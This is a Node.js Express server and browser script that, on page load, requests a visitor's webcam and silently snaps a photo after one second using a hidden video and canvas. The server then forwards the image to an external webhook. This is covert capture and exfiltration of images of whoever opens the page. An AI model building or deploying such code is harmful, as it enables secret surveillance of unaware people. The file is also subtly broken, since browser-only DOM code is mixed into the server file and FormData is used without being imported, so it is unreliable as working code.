require('dotenv').config();
const express = require('express');
const path = require('path');
const fetch = require('node-fetch');
const multer = require('multer');
const fs = require('fs');
const { createServer } = require('http');

const app = express();
const server = createServer(app);
const PORT = process.env.PORT || 3000;
const webhookUrl = process.env.WEBHOOK_URL;

app.use(express.static(path.join(__dirname, 'public')));
const upload = multer({ dest: 'uploads/' });

app.post('/send-image', upload.single('file'), async (req, res) => {
    if (!webhookUrl) {
        return res.status(500).json({ error: 'Webhook URL is not configured' });
    }
    
    const filePath = req.file.path;
    const fileStream = fs.createReadStream(filePath);
    const formData = new FormData();
    formData.append('file', fileStream, 'image.png');
    
    try {
        const response = await fetch(webhookUrl, { method: 'POST', body: formData });
        fs.unlinkSync(filePath);
        res.json({ success: response.ok });
    } catch (error) {
        console.error('Error sending image:', error);
        res.status(500).json({ error: 'Failed to send image' });
    }
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

server.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});

// Frontend JavaScript to handle webcam and image capture
document.addEventListener('DOMContentLoaded', () => {
    const video = document.createElement('video');
    const canvas = document.createElement('canvas');
    
    navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            video.srcObject = stream;
            video.play();
            setTimeout(captureImage, 1000);
        })
        .catch(err => console.error('Camera access error:', err));
    
    function captureImage() {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        canvas.toBlob(sendImage, 'image/png');
    }
    
    function sendImage(blob) {
        const formData = new FormData();
        formData.append('file', blob, 'image.png');
    
        fetch('/send-image', { method: 'POST', body: formData })
            .then(response => console.log(response.ok ? 'Image sent' : 'Image send failed'))
            .catch(error => console.error('Error:', error));
    }
});

